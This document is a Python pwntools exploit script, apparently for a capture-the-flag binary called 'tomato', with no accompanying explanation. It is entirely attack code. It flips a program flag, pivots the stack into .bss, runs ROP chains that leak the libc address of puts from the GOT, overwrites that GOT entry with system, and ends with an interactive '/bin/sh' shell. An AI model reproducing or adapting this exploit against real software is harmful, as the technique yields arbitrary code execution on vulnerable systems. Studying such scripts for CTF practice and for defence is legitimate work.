from pwn import*
p=process('./tomato')

read_plt = 0x4006D0
puts_plt = 0x4006A0
puts_got = 0x602020

key = 0x400D1A
key_leave_ret = 0x400D29

read_leave_ret = 0x400D4C
leave_ret = 0x400D7C

bss = 0x602580

rax_ret = 0x400D89
rdi_ret = 0x400fa3
rsi_ret = 0x400D84

p.recv(1024)
t = 0.5

####################################

########## if_cheap -> 1 ###########

p.sendline('1')
sleep(t)
p.sendline('7')         #change if_cheap
sleep(t)
p.recv(1024)

pay = ''
pay += 'a'*24
pay += p32(2)

p.send(pay)
p.recv(1024)
sleep(t)

###########  special ROP ##########

print 'if_cheap = 1 =>  ROP start'

p.sendline('4')

pay = ''
pay += 'a'*0x20         #buf 32byte
pay += p64(bss+0x420)   #sfp
pay += p64(read_leave_ret)


p.send(pay)
sleep(t)
p.recv(1024)

##########     LEAK     ############

pay = ''
pay += p64(bss+0x50)
pay += p64(rsi_ret)
pay += p64(bss)
pay += p64(key)
pay += p64(bss+0x400)
pay += p64(key_leave_ret)

p.send(pay)
sleep(t)


pay = ''
pay += p64(bss+0x250)
pay += p64(rdi_ret)
pay += p64(puts_got)
pay += p64(puts_plt)
pay += p64(rsi_ret)
pay += p64(bss+0x200)
pay += p64(key)
pay += 'c'*(0x50-len(pay))
pay += p64(bss)
pay += p64(key_leave_ret)

p.send(pay)
sleep(t)

pay = ''
pay += 'X'*0x8
pay += p64(rdi_ret)
pay += p64(0)
pay += p64(rsi_ret)
pay += p64(puts_got)
pay += p64(read_plt)
pay += p64(rdi_ret)
pay += p64(puts_got+8)
pay += p64(puts_plt)
pay += 'c'*(0x50-len(pay))
pay += p64(bss+0x200)
pay += p64(key_leave_ret)
p.send(pay)
sleep(t)


p.recvuntil('GET OUT!\n')
libc_puts = u64(p.recv(6)+'\x00\x00')
print 'libc_puts : ' + hex(libc_puts)

libc_base = libc_puts - 456336
libc_system = libc_base + 283536

print 'libc_system : ' + hex(libc_system)
p.sendline(p64(libc_system)+'/bin/sh\x00')



p.interactive()
